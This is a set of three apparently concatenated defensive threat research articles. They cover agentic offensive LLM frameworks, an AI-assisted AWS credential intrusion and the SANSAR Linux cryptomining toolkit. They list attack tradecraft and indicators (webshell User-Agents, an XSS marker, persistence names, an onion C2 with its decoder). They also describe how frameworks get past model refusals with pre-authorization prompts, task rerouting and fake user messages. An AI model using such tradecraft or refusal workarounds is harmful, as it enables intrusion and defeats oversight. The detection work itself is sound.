Five agentic offensive frameworks install with a single script or Compose file and have drawn more than 60,000 GitHub stars between them: ARTEX, CyberStrikeAI, Cairn, PentAGI, and HexStrike. All five have already turned up in intrusions rather than only in red team engagements. Google Threat Intelligence Group (GTIG) and Mandiant have observed ARTEX, Cairn, HexStrike, and PentAGI in incident response engagements, and Microsoft has attributed ARTEX use to Storm-0940. We traced an AI-assisted AWS intrusion to a CyberStrikeAI server in One CyberStrikeAI Server, Eight AWS Identities.

An agentic offensive framework puts a large language model (LLM) in charge of the scanners, curl, shells, and cloud CLIs that red teams and threat actors already use. The tools are familiar, but the loop around them is new: a model plans each step, splits the work across agents, builds or installs what it lacks, and in ARTEX’s case moves on in bursts of two to 25 seconds. We read the source of all five, alongside the public incident reporting, to work out what reaches a defender’s telemetry when one of them runs. None of them enforces authorization in code, and every action they take still has to land in telemetry you already collect.

Key takeaways

Agentic frameworks such as ARTEX work in bursts of seconds, so the detections trusted to start containment have to be chosen before an incident begins.

None of the five frameworks enforces authorization in code by default. Three assert it in the prompt, and the only target restrictions active by default are blocklists for government and education domains.

The frameworks are loud by default and, in ARTEX and CyberStrikeAI, change route when blocked. They also change faster than signatures, but their actions do not. Every action that touches your environment reaches defenders as a process, a web request, an API call, or a sign-in, so detections anchored on behavior outlast those anchored on a source address, a User-Agent, or a framework's fingerprint.

How agentic offensive frameworks differ from Traditional C2 Frameworks

Cobalt Strike and Brute Ratel C4 put a human operator behind an implant, deciding what to run next. Agentic frameworks keep the tools and replace the operator's think time with a planning loop. GTIG observed ARTEX execution bursts of roughly two to 25 seconds, while NorForge, tracking exposed Cairn panels it assessed as malicious, found that one actor cluster's successful projects took just under 23 hours on average from start to goal. Individual bursts fit within a short detection window, but operations can run for hours, so connecting bursts into one operation requires a long lookback.

The agents and most of the tooling usually run on infrastructure the attacker controls, calling a hosted or self-run model. What reaches your environment is what the tools do to it, recorded as new processes on your hosts, API calls in your cloud audit logs, and sign-ins.

ARTEX, CyberStrikeAI, Cairn, PentAGI and HexStrike compared

The five frameworks share the same loop but differ in where the model runs and what starts each tool.

Autonomy is the default. CyberStrikeAI ships with approval mode off, PentAGI's Compose file sets ASK_USER to false, Cairn launches two of its three coding-agent worker types with their approval prompts disabled, and ARTEX runs its agents in a bypass permission mode, so none of the four waits for human approval by default.

Beyond the shared loop, each framework makes a distinctive design choice.

ARTEX pairs an event-driven planner with parallel workers and keeps the human to a chat agent that observes progress and steers by hints. Its bundled browser extension records an operator's authenticated session, with captchas and one-time codes solved once, and hands those requests to the agents as evidence. We reviewed a public English-translated copy of the original repository.

CyberStrikeAI is a complete operator console. It builds its own implants, runs C2 listeners and a WebShell manager, and connects to chat platforms such as Telegram, Slack, Discord, and DingTalk.

Cairn delegates the work to existing coding agents. Its workers are command-line tools running inside Kali containers, and its README describes its debut in an AI penetration testing competition.

PentAGI keeps its agents moving with a reflector agent. When an agent hesitates or answers in prose instead of acting, the reflector replies in the user's voice, and the exchange is recorded as a human message.

HexStrike has no model of its own. It exposes about 150 tool functions through the Model Context Protocol (MCP) to whatever AI assistant the operator already uses.

What each framework ships differs as well. CyberStrikeAI builds its own implants, and three of the five bundle cloud tooling, which puts cloud accounts within reach as readily as hosts.

What agentic offensive frameworks change for detection and response

Agentic attacks land effects in seconds

Within a burst, an agentic loop issues steps seconds apart, and each step takes effect as soon as it is sent. At that pace, the decisions that matter are made before an incident begins, starting with which detections are trusted to start containment automatically.

Do agentic offensive frameworks check authorization?

Like conventional offensive tools, none of the five frameworks enforces authorization in code by default. Three of them go further and tell the model it is authorized. CyberStrikeAI tells its model that authorization was settled in advance and that it should never question it or wait for approval, PentAGI opens nine of its role prompts with a pre-authorization block, and ARTEX describes each agent as part of an authorized penetration testing system. Cairn instructs its workers never to reject a task, and when a model refuses anyway, its dispatcher sidelines that worker for five seconds and hands the task to another configured worker, or retries the same one if it is the only worker.

The only target restrictions active by default are blocklists for government domains in ARTEX and CyberStrikeAI, and for education domains in ARTEX. Beyond those blocklists, the safeguards that ship are narrow:

ARTEX blocks destructive commands such as rm -rf and mkfs, and can check a task’s assets against an allow list the operator writes, which is empty by default. A shell command can still reach any host.

ARTEX’s rules-of-engagement scope mechanism was removed, its source notes and assets its workers record are added to the task’s scope automatically.

HexStrike accepts an out-of-scope list and never consults it.

ARTEX labels its own blocks as platform controls because a bare denial reads to an agent like a target's defense to bypass. A model provider's refusal is not a control defenders can rely on, because a framework can route around it, as Cairn's dispatcher can.

How agentic offensive frameworks respond when you block them

As shipped, the five frameworks default to capability, autonomy, and speed. Their scanners run with stock settings, several defaults name the framework outright, and CyberStrikeAI's implant checks in every five seconds with no jitter. Stealth ships as skills the model can load. CyberStrikeAI's operational security skill covers rate limits, IP-ban workarounds, and anti-forensics.

The change comes when ARTEX or CyberStrikeAI is blocked. ARTEX tells its workers that a filtered payload or a 404 does not exhaust an intent, and GTIG, relaying Wiz Research's findings on a campaign it tracks as UNC7228, reports that the actor fell back to open proxies when its initial infrastructure was blocked. CyberStrikeAI's skills tell the agent to answer a block by switching proxies, User-Agents, and forwarding headers, falling back to free proxies in the target's own country and then Tor. After a block, expect the same requests to return from new addresses and User-Agents, so detections that key on what is requested hold up better than those keyed on source address. A block on the source address leaves the framework's access in place, so it should be paired with revoking the credentials the framework was using.

Why IOC-based detections go stale on agentic frameworks

Agentic offensive frameworks move quickly. ARTEX's developers logged about 390 commits, more than 450 counting merges, in the ten and a half weeks from July 26 to October 7, 2026, and after its creator took the original repository down in October 2026, public forks carried it on. CyberStrikeAI logged more than 2,400 commits in its first year, and several of the frameworks write or install new tools in the middle of a task. The strings, file names, and defaults that identify a framework today can disappear in its next release, while the behaviors it depends on, such as credential access, remote execution, and offensive tools started by a service, stay the same, so detections anchored on behavior age more slowly than those anchored on a framework's fingerprint.

Why revoking credentials does not stop an agent immediately

AWS and Google each document a propagation delay for access changes, and in Entra ID an access token issued before a user or service principal is deleted or disabled generally stays valid until it expires, typically 60 to 90 minutes, unless the resource and client support continuous access evaluation, which Microsoft documents for Exchange, Teams, and SharePoint and, for service principals, only Microsoft Graph. An acknowledged revocation may not stop the next request, and an agent operating at machine speed can act within that gap. AWS's role-session revocation also leaves IAM users' long-term keys alone and does not block sessions requested after its cutoff, so pair it with removing whatever can still assume the role.

How to detect agentic offensive frameworks

Detecting agentic tempo and sequence per identity

Behavioral rules are the foundation, and the reach of the tooling sets how broad they need to be. GTIG's catalog of ARTEX tradecraft includes SQL injection, Kerberoasting, and mapping of Azure and AWS permissions. Agentic tempo adds two signals that emerge between individual events.

Tempo per identity. Count distinct sensitive actions per identity and issuing role in short windows, so a burst stands out even when every action in it is routine.

Sequence across sessions. Join discovery, secret access, and remote execution under the issuing role or source address to link activity from several sessions into one operation.

Higher-order detection rules apply the same logic to alerts, correlating related alerts that share a host, user, or address into a higher-confidence finding, because each added signal makes a benign explanation less likely. We expect more signals like these to emerge as the frameworks change.

An ES|QL hunt for tool-family bursts

A loop works through its toolbox as the task demands, so one source address can use curl, a Python client, a browser User-Agent, and an AWS client within the same minute. The ES|QL hunt below normalizes User-Agents into tool families, counts families and requests per source address in one-minute windows, and returns windows with at least three families and a burst of requests. Because the loop runs on infrastructure the attacker controls, the hunt reads the logs that record its requests, such as web server, proxy, and cloud audit logs (point the index pattern at those sources), and it excludes private, loopback, link-local, carrier-grade NAT, and multicast source ranges.

Build systems, monitoring scripts, administrators working from the AWS CLI, and shared NAT or proxy addresses can also mix these clients, so baseline that automation and tune the thresholds of three families and 20 requests per minute before alerting on the results. The hunt keys on how many kinds of client one address uses in a minute, so it does not depend on any single string, but a framework that returns from a new address starts a new window. The family list can also take the framework User-Agents in the table below, and norma* already covers the norma/0.4 that ARTEX's web fetch tool sends.

What to watch for in ARTEX, CyberStrikeAI, Cairn, PentAGI and HexStrike

These defaults appear on the systems under attack and, where noted, on a host you monitor. They are worth hunting for today, though any of them can change in the next release.

Framework

What to watch for

ARTEX

Traffic from the scanners it ships, such as nuclei, httpx, katana, ffuf, and sqlmap, which three parallel workers per task run by default, requests with the User-Agent artex-enrich/1.0 or norma/0.4, and new accounts registered on your applications followed by sign-ins from several sessions, because its agents register and share their own test accounts.

CyberStrikeAI

Webshell requests that carry the User-Agent Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0) and a pass form field, a web server process running echo :OSPROBE_%OS%:END, and implant persistence named SystemUpdate (a scheduled task or Run key) or com.apple.systemupdate (a LaunchAgent), a .bashrc line ending in # cs, or an @reboot cron entry that launches the implant binary and carries no marker of its own.

Cairn

Reverse shells and out-of-band callbacks to the operator host's own address, because its example configuration runs worker containers on the host's network. Where it runs on a host you monitor, two of its three worker adapters start their coding-agent command-line tools with approval prompts disabled and the full task prompt in the command line.

PentAGI

Connections from compromised hosts to TCP ports 28000 to 29999 on the PentAGI host (two per engagement by default), and each page it browses requested twice at once, once for content and once for a screenshot. An installation on your network also reports to update.pentagi.com every three hours.

HexStrike

The User-Agents HexStrike-HTTP-Framework/1.0 and HexStrike-BrowserAgent/1.0 and, when the browser agent's active tests run, the cross-site scripting marker <hexstrikeXSSTest123>. Where it runs on a host you monitor, a Python server listens on port 8888 by default on all interfaces and starts security tools through a shell, so a tool can show the Python server as its parent.

Beyond these defaults, the scanners run with stock settings, so on the network the frameworks largely resemble the tools they drive.

How to defend against agentic offensive frameworks

Decide in advance which high-confidence detections start containment. Connect them to automated response actions on endpoints and to Elastic Workflows to orchestrate the response, including calls to your own automation for cloud steps such as deactivating an access key or revoking a role's active sessions.

Combine any block on a source address with revoking the identity's sessions and tokens, because these frameworks return from new addresses, then confirm that the next request fails.

Measure tempo and sequence per identity over windows long enough to connect bursts, and baseline the automation that already behaves like an agent.

Scope assumed roles and app-only identities to the actions they need, because an agent inherits everything the identity allows.

Remove secrets from the places an agent can read, such as file shares, wikis, code repositories, and CI/CD variables, rotate any that were exposed, and prefer short-lived credentials. GTIG reports that operators hand ARTEX compromised credentials and that it harvests more through Kerberoasting, SQL injection, and DCSync, so each exposed secret lets an operation reach another platform and makes containment harder.

Act on threat intelligence about framework infrastructure. GTIG reports ARTEX and PentAGI used against multiple organizations, and exposed consoles such as Cairn's can be enumerated from the internet, so intelligence on their infrastructure is an early chance to block an intrusion. Block those addresses at the perimeter or proxy, and feed the same intelligence into Elastic's threat intelligence integrations so the prebuilt Threat Intel IP Address Indicator Match rule flags traffic to and from known consoles and C2 servers. Build an enrichment workflow, triggered by the alert, that runs a reputation lookup on the matched address. Consoles can sit behind shared hosting or CDN addresses, so the lookup helps separate a dedicated server from a shared address before a match drives a block, and behavioral detections still cover the infrastructure that changes.

Open questions about agentic offensive frameworks

These are worth answering now, before the next releases change the answers.

What changes when the agent extends itself? ARTEX's operator assistant can create new tools, MCP servers, and skills, and PentAGI keeps the code it writes in a store shared across engagements. A tool written for one target has no history to match, which favors detections on behavior and parentage over tool names.

Is the advantage pace or adaptation? Scripts can match an agent's pace, so the more meaningful test is how quickly a new finding or an unfamiliar error becomes a new action.

How many actors is a multi-agent run? ARTEX runs a planner and parallel workers under one task. Several sessions or agent names can look like several actors, but the identity and controller behind them is the unit that matters.

Conclusion: What this means for detection and response

Agentic offensive frameworks amount to a new kind of operator, a loop that plans, coordinates agents, extends its own tools, and moves at a tempo that changes what detection and response have to do. None of the five enforces authorization in code by default, which leaves defender telemetry and controls as the real boundary.

This analysis covers five frameworks, and more deserve tracking. Gambit Security reported a criminal campaign that used Strix for vulnerability discovery, Cairn for exploitation, and the general-purpose agent Hermes as its control console. Other open-source projects that use models for penetration testing include Shannon, PentestGPT, CAI (now archived), CyberStrike (not CyberStrikeAI), RedAmon, PentestAgent, hackingBuddyGPT, Nebula, and BugTraceAI. New ones will keep appearing, so track each by how it plans, what starts its tools, and what it leaves for defenders to see.

Elastic's behavioral rules key on the actions these frameworks take, such as credential access and remote execution, rather than on the framework or the model, and LLM-based triage rules can roll related alerts on one user or host into a single verdict. Elastic keeps adding AI-focused protections, and its rules are published in the open detection-rules and protections-artifacts repositories. Add tempo and sequence analysis per identity, confirm that revocation took effect, and contain through automated response actions and Elastic Workflows, so the response is decided before the operation starts.

articles.full_text:
One server read 56 EC2 user data scripts in 141 milliseconds. Then it went quiet for 14 days and came back. That gap did more damage than the burst, because fixed correlation windows cannot span two weeks.

Between September 30 and October 16, 2026, a CyberStrikeAI server worked through stolen AWS credentials in a familiar sequence: validate identities, harvest secrets from Secrets Manager, pull EC2 user data, decrypt an SSM parameter, send a remote command. Every one of those is a call a legitimate role makes every day. Nothing in CloudTrail looked urgent at the time.

CyberStrikeAI is an open-source platform that pairs LLM agents with offensive security tools. Will Thomas at Team Cymru counted 21 IPs running it in early 2026, all of them aimed at Fortinet edge devices. This is the first case we have seen of the same tooling turned on AWS.

We call this AI-assisted on the strength of the tool attribution and the machine-speed behavior in the logs. We cannot prove an LLM agent was making the decisions, and we do not know how the attacker obtained the credentials.

Key findings from the CyberStrikeAI AWS intrusion

Between Sep 30 and Oct 16, 2026, one CyberStrikeAI server (43[.]240[.]29[.]11) used credentials from eight AWS identities (five IAM users and three EC2 instance roles) across four accounts and generated 78 alerts.

app-role sent 56 user data requests in 141 milliseconds, part of 58 user data retrieval alerts (74% of the total), which points to automated tooling.

On Oct 2, container-role read an encrypted SSM parameter and issued an SSM SendCommand 29 seconds later. The audit log does not show what the command was or whether it succeeded.

43[.]240[.]29[.]28 and 43[.]240[.]29[.]33 serve a CyberStrikeAI page on port 8080 with the same self-signed certificate as 43[.]240[.]29[.]11, which ties the three servers together. As of November, none of the three is serving that interface, so treat the IPs as indicators for retrospective hunting.

All 78 alerts were medium or low severity and only made sense once correlated by source IP.

None of this proves an LLM agent was making decisions, but it matches how an agentic platform works through a list of credentials and targets.

Automating IAM containment with Elastic Workflows

AI-assisted offense is often sporadic and fast, especially with compromised identities. Elastic Workflows can enable responders by making API calls to AWS services such as IAM to block the identity automatically.

Elastic Workflows, shipped with the stack (9.4+), lets detection rules invoke custom workflows with a YAML-defined pipeline of steps on every alert. Invokes an AWS Lambda function through Elastic’s AWS Lambda connector

Deactivates compromised access key using iam:UpdateAccessKey.

Blocks older temporary sessions associated with IAM user by adding inline deny policy via iam:PutUserPolicy and aws:TokenIssueTime cutoff

Behavioral indicators to hunt for in CloudTrail:

A burst of DescribeInstanceAttribute calls requesting userData, many per second, from one role session.

First-time GetCallerIdentity calls from the same external IP across several accounts or users within the same minute.

GetSessionToken or GetSecretValue from an instance role session whose source IP is not the instance or your NAT.

GetParameter with decryption followed within a minute by SSM SendCommand from the same role.

We added two high-severity, low false positive ES|QL detections for the burst enumeration behavior: AWS EC2 Bulk User Data Enumeration alerts when one principal and source IP read userData from more than 20 distinct instances in 10 minutes, and AWS STS GetCallerIdentity Bulk Account Enumeration alerts when three or more distinct non-role identities call GetCallerIdentity from the same external IP and ASN in 10 minutes.

How to respond if your AWS identities were exposed

Assume anything an affected role could read is compromised, and work outward from the credentials.

Rotate credentials for every identity that touched the indicator IP, and revoke active sessions, including those from temporary credentials.

For instance roles, rotate by replacing the instance profile or the instance, since stolen role credentials expire but can be reissued while the host stays compromised.

Treat all secrets in EC2 user data as exposed, and move them to the Secrets Manager or Parameter Store.

Review SSM command history for the window of any unexpected SendCommand call to see what ran. Check for abuse of AWS-managed documents, AWS-RunShellScript and AWS-RunPowerShellScript or custom documents.

Check non-production roles and secrets for overlap with production.

Block the indicator IP at the WAF, VPC, NaCL and security group level, but rely on the behavioral detections, since the infrastructure can change and network blockage is not effective at stolen credentials to API calls prevention.

Restrict ec2:DescribeInstanceAttribute for userData to the roles that need it, using IAM policy or a service control policy.

Enable GuardDuty if it isn't already, and alert on credentials used from outside your expected IP ranges.

Hunt for how the instance credentials were obtained, starting with exposed web applications, SSRF, code repositories and IMDS.

Conclusion: What this intrusion means for alert correlation

AI-assisted attacks are driven by objectives, so they generate a lot of alerts. One CyberStrikeAI server produced 78 alerts across six rules in 16 days, and 65 of them came on the first day. Every alert was medium or low severity, and each one looked routine on its own: a first-time GetCallerIdentity, a GetSessionToken, an SSM SendCommand from a rare user. Only the shared source IP showed they belonged to one intrusion.

Defenders need high-signal detections to stop the damage early; low false positive behavior rules, such as the two bulk enumeration rules described above, that justify acting immediately. Medium and low severity alerts are good candidates for correlation, but only by source IP, and the correlation window needs to be flexible because AI-assisted activity is irregular. Here, 56 requests landed in 141 milliseconds, later steps came hours to days apart, and the operator returned after 14 days. A short fixed window would have split this intrusion into unrelated alerts.

High-signal detections can also drive remediation. Attached to a workflow, such as those in the Elastic Workflows library, a rule like this can disrupt the attack automatically, for example by blocking the source IP, while analysts investigate.

articles.title: 0% GPU utilization: How SANSAR hides Linux cryptomining
articles.context: Elastic Security Labs is tracking REF3364, a Linux cryptomining intrusion that combines custom malware with publicly available miners
articles.full_text:
Elastic Security Labs is tracking REF3364, a Linux cryptomining intrusion that combines custom malware with publicly available miners. The toolkit includes SANSAR, a Rust orchestrator that receives commands over Tor (The Onion Router) used to manage CPU and GPU miners.

The threat actor also deployed a kernel rootkit to hide selected processes and files, an NVIDIA Management Library (NVML) wrapper to falsify GPU readings, and a separate backdoor named netns. This backdoor retrieves its C2 address from an Ethereum smart contract before connecting to the server directly.

The use of public blockchains to locate C2 infrastructure is a pattern we also discussed in our 2026 Threat Command quarterly report.

Key takeaways

The actor abused an exposed Ray job agent, obtaining root and deploying the toolkit across three Linux GPU hosts.

SANSAR uses Tor for C2 and supervises CPU and GPU miners.

SANSAR’s command handlers support miner configuration and interactive shells.

The NVIDIA Management Library (NVML) wrapper falsifies GPU readings, while the kernel rootkit hides selected processes, files and socket entries.

Initial access: an exposed Ray job agent

The attacker compromised the first host through an exposed Ray job agent. Ray is an open-source framework for distributing Python workloads, including AI model training and inference, across multiple machines. Its Jobs API lets users submit commands to run applications on the cluster.

On that host, the dashboard on Ray's head node listened only on the local loopback interface. The job agent remained reachable from the internet and accepted job submissions without authentication. The attacker used this interface to execute commands through Ray.

Between October 22 and 25, 2026, the recorded activity progressed from external probing to persistent access:

October 22, 2026: external probes first appeared in the Ray logs.

October 24, 2026: a submitted job ran the NVIDIA System Management Interface (nvidia-smi) and sent the GPU inventory to an external server.

October 25, 2026: the actor submitted a Python reverse-shell job that connected to an external listener.

The reverse shell ran under the local account that owned the Ray session. The actor subsequently added an SSH key to that account’s authorized_keys file to establish persistent access.

Inside the SANSAR Linux cryptomining toolkit

Toolkit deployment

After obtaining root, the actor staged the toolkit under /opt/vadi_, built the acpi_thermal_mgr kernel module through Dynamic Kernel Module Support (DKMS) and added an initramfs loader. An initramfs is a temporary root filesystem loaded into RAM during early boot, before Linux switches to its normal root filesystem. The module and loader are stored in the boot image on disk, so the rootkit can load again when the host boots with that image.

The installation also replaced the NVML library and registered the separate netns backdoor as a systemd service.

The GPU miner arrived later on two hosts. A kernel log records /opt/vadi_/tilki starting on one machine; cache creation and new GPU contexts support execution on the other system.

The diagram below shows the toolkit’s components, SANSAR’s Tor control channel and the separate netns backdoor’s use of Ethereum to retrieve its C2 address:

SANSAR analysis: anti-debugging and the encoded onion C2 domain

The name SANSAR comes from its filename and the sansar-client v0.1.3 version string.

Before setting up the connection, SANSAR performs an anti-debugging check by reading /proc/self/status and exits if TracerPid is nonzero. It also records the time for a 1,000-iteration loop and exits if it takes 501 milliseconds or longer.

The controller hostname is stored as 62 encoded bytes. We reproduced the decoder offline: each byte is rotated right by (i % 7) + 1, then XORed with a byte from a repeating 32-byte mask.

plaintext[i] = ROR8(ciphertext[i], (i % 7) + 1) XOR mask[i % 32]

Which results to the following domain with a hardcoded port value of 9051:

efxisnqldelyr5ra25oqfrsut54b34g26e7zrsiuupsoekjof2gho2id.onion:9051

SANSAR uses this onion service for C2 communication, receiving commands, reporting host inventory and obtaining the miner’s status.

Tor client initialization

SANSAR uses Arti, the Tor Project's Rust implementation of Tor, as a library for its C2 connection. It resolves its supporting paths relative to the executable directory. These include:

arti_data/state

arti_data/cache

bridges

.client_id

lyrebird

The bridges file lists alternative entry points into Tor. Bridges are relays whose addresses are not listed in the public relay directory and can help clients reach Tor when direct connections are blocked. The collected file contains seven WebTunnel entries and three obfs4 entries.

Sansar supports two Tor connection modes. Direct mode connects through Arti without Lyrebird. Bridge mode uses Lyrebird to reach Tor through the configured WebTunnel or obfs4 bridges. Both modes connect to the same onion C2. Their initial bootstrap deadlines are 60 and 900 seconds, respectively.

Host and GPU enumeration

SANSAR collects GPU information with the following command:

nvidia-smi --query-gpu=name --format=csv,noheader

SANSAR uses the startup result to decide whether a GPU miner can be launched. It repeats the query during registration and sends both GPU inventories to the C2, together with the logical CPU count.

Registration, HMAC authentication and heartbeats

SANSAR sends a 40-byte authentication field during registration: a timestamp followed by an HMAC-SHA256 digest. It calculates the digest from the client ID followed by the timestamp, using a key embedded in the binary. Host inventory is not included in the calculation.

timestamp = BE64(unix_seconds) authentication = timestamp || HMAC-SHA256(K, client_id_bytes || timestamp)

Heartbeats report how long SANSAR has been running, its Tor connection mode (direct or bridge) and the number of successful reconnects. They can also report how many bridges were tested, how many were healthy and when the last test ran.

SANSAR’s binary C2 message protocol over Tor

SANSAR exchanges binary messages over its Tor connection. Each frame starts with a four-byte big-endian body length, followed by a four-byte little-endian message type and the payload for that type. The length covers the type and payload, excluding the length field itself.

typedef struct { uint8_t body_length[4]; uint8_t message_type_id[4]; uint8_t payload[]; } sansar_c2_comm_frame;

General command handlers

ReportVersion returns sansar-client v0.1.3. The Restart handler replies with success and Restart initiated, then returns to message processing without restarting SANSAR. Custom returns an unknown-command error without executing the supplied command or arguments.

Interactive shells in a pseudo-terminal

ShellOpen starts /bin/bash --norc --noprofile in a pseudo-terminal. It sets HISTFILE=/dev/null and zeroes the history-size variables to suppress saved shell history. A session ID links subsequent input, resize and close requests to the correct terminal. SANSAR forwards the terminal's output to the C2.

CPU and GPU miner management

The C2 sends a MinerStart message to SANSAR with the settings for a mining job: the pool address, wallet or pool login, optional algorithm, extra command-line arguments and proxy flag. SANSAR saves this configuration and uses it to build the miner's command line. Its launch paths provide no hardcoded fallback for the pool or wallet/login.
